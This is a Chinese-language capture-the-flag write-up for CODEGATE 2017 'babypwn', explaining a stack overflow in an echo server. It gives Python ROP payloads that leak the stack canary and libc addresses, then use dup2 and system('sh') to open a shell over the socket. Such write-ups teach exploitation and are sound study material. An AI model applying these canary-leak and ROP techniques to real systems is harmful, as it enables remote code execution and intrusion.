---
title: '[CODEGATE CTF 2017] babypwn 50'
author: Naetw
tags:
  - pwn
  - CODEGATE CTF 2017
  - stack overflow
  - ROP
categories:
  - write-ups
date: 2017-02-11 10:38:40
---

這是這次比賽唯一解出的一題 Orz，最近 BambooFox 人越來越少了，自己戰力也不足@@ 分析太慢經驗也太少...

## Analyzing

32 bit ELF, Partial RELRO, 有 canary & NX, 沒有 PIE

如同他的名字是一個蠻簡單的題目。有一個明顯的 stack overflow 漏洞，唯一比較麻煩的部分是 socket 的部分，因為這部分還沒學過，也就不多說了，會影響的只有最後 ROP 的部分。

程式主要功能在 `0x08048A71` function 裡，前面都在做 socket 的建置，如果要在 local 端測試的話，會先用 `ncat -vc ./babypwn -kl 127.0.0.1 4000` 架起來，看了一下 src，我們會先 `nc localhost 4000`，之後程式就會跑起來，並且把主要功能開在 port 8181，所以一旦 `nc localhost 4000` 過，之後測試就用 8181 這個 port 來測試就行了。

連上去之後，程式行為很簡單：

```
===============================
1. Echo
2. Reverse Echo
3. Exit
===============================
Select menu > 1
Input Your Message : AAAA
AAAA

===============================
1. Echo
2. Reverse Echo
3. Exit
===============================
Select menu >
```

就是一個 echo server，第一直覺以為會是 format string，但是就是簡單的 echo 行為，不過在 echo 時，可以用 overflow 來 leak canary，後面才能利用 ROP 來做事。

**overflow**：

開 ida pro 來看
```
char buf; // [sp+24h] [bp-34h]@1
...
socket_recv(&buf, 100)
```

這邊很明顯的 overflow，buf 的開頭距離 ebp 有 52，但是卻可以 input 100 bytes，因此這邊先算好跟 canary 的 offset，然後把 buf 塞成以下樣子：

```
0xff951f54:     0x41414141      0x41414141      0x41414141      0x41414141
0xff951f64:     0x41414141      0x41414141      0x41414141      0x41414141
0xff951f74:     0x41414141      0x41414141      0x4409b50a      0x00000000
```
上面的 `0x4409b50a` 就是 canary，不過因為 canary 的 first byte 都會是 '\x00'，因此這邊用 '\x0a' 也就是換行把它蓋著，才能接著把後面的值 dump 出來後，把 '\x0a' 換成 '\x00' => `0x4409b500` 就是這個 binary 的 canary。

這邊有了 canary 後就可以繞過 stack guard 的檢查，疊 ROP 來控制 eip 了，不過這邊還是沒辦法開 shell，因為 socket 的 file descriptor 跟 stdin & stdout 不同，所以我們會需要先用 `dup2` 來讓 stdin & stdout 跟 socket 的 file descriptor 接起來，之後就能開 interactive shell on socket server。

但是要用到 `dup2` 會需要 libc base，這邊我們先做第一次的 ROP，把 GOT entry 上的 libc function address leak 出來，之後利用 [libc database](http://libcdb.com) 來找出遠端 server 的 libc 版本，此外我們也要先把 file descriptor leak 出來。

因此這次 ROP 我們 payload 如下：

```python
socket_send = 0x080488B1
pop1 = 0x08048589
sigemptyset_got = 0x0804B048
echo_select = 0x08048A71
fd_address = 0x0804B1B8
rop1 = [socket_send, pop1, sigemptyset_got, 
        socket_send, echo_select, fd_address]
payload = 'A'*40 +      # padding to canary
        p32(canary) +
        'A'*12 +        # padding to return address
        ''.join(map(p32, rop1))
```

這裡的 `socket_send` 用的是原本就寫好用來 echo input 的 function，`pop1` 則是利用 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 找到的一個 pop 一次後 ret 的 gadget，而 `echo_select` 則是上面提到的主要 function 的位址，因為 leak 玩東西之後我們要再做一次 ROP 來使用 `dup2` 以及開 shell。

這裡他會從 `sigemptyset_got` 開始 leak 很多 libc function，我拿前面四個到上面說的 libc database 查版本是可以查到的。

拿到 libc base 之後，直接在疊一次 ROP，這次 ROP 會用 `dup2` 把 stdin & stdout 跟 socket 的 fd 接起來，之後馬上開 shell：

```python
pop2 = 0x08048B84
sh = base + next(libc.search('sh\x00'))
rop2 = [dup2, pop2, fd, 1,
        dup2, pop2, fd, 0,
        system, 0xdeadbeef, sh]
payload = 'A'*40 +      # padding to canary
        p32(canary) +
        'A'*12 +        # padding to return address
        ''.join(map(p32, rop2))
```

疊完之後，利用 choice 3 - exit 他會用 return 結束，就可以接到我們寫上去的 ROP gadgets 了。


## Note

這次題目開了兩個 port，第一個 port 似乎太多人連...導致開 shell 不知道為啥開不起來，同樣的 payload 在第二個 port 十分順利＠＠
